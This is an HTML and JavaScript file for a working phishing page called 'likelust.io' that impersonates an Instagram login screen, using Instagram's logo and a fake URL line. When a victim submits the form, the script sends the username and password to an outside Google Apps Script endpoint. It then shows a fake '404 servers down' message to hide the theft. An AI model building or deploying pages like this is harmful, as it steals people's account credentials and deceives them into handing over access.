<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>likelust.io</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fafafa;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .login-box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px 20px;
      width: 100%;
      max-width: 350px;
      text-align: center;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
      animation: fadeIn 1s ease-in-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .fake-url {
      font-size: 0.8em;
      color: #999;
      margin-bottom: 10px;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      font-size: 16px;
    }
    button {
      background: #3897f0;
      color: white;
      cursor: pointer;
      font-weight: bold;
    }
    img {
      width: 175px;
      margin-bottom: 20px;
    }
    .toggle-password {
      text-align: right;
      margin-top: -8px;
      font-size: 0.9em;
      cursor: pointer;
      color: #00376b;
    }
    .toggle-password:hover {
      text-decoration: underline;
    }
    .error-screen {
      text-align: center;
      padding: 20px;
      font-family: sans-serif;
    }
    .error-screen h1 {
      font-size: 40px;
      margin: 0;
    }
    .error-screen p {
      color: #888;
    }
    @media (max-width: 400px) {
      input, button {
        font-size: 14px;
      }
    }
  </style>
</head>
<body>
  <div class="login-box" id="loginBox">
    <p class="fake-url">https://likelust.io/accounts/login</p>
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
    <form id="phishForm">
      <input type="text" id="username" name="username" autocomplete="username" placeholder="Phone number, username, or email" required>
      <input type="password" id="password" name="password" autocomplete="current-password" placeholder="Password" required>
      <div class="toggle-password" onclick="togglePassword()">Show Password</div>
      <button type="submit">Log In</button>
    </form>
  </div>

  <div class="error-screen" id="errorScreen" style="display:none;">
    <h1>404</h1>
    <p>LikeLust Servers are Currently Down. Please try again later.</p>
  </div>

  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbxeeRW76Vn8MfC_DgnfMxxvuGaJyQzmVgeFofR6nCu5wSknftS59ztgCnvHm12MYmjW/exec';

    document.getElementById('phishForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const data = {
        username: document.getElementById('username').value,
        password: document.getElementById('password').value
      };

      fetch(scriptURL, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });

      document.getElementById('loginBox').style.display = 'none';
      document.getElementById('errorScreen').style.display = 'block';
    });

    function togglePassword() {
      const pwd = document.getElementById('password');
      const toggle = document.querySelector('.toggle-password');
      if (pwd.type === 'password') {
        pwd.type = 'text';
        toggle.textContent = 'Hide Password';
      } else {
        pwd.type = 'password';
        toggle.textContent = 'Show Password';
      }
    }
  </script>
</body>
</html>
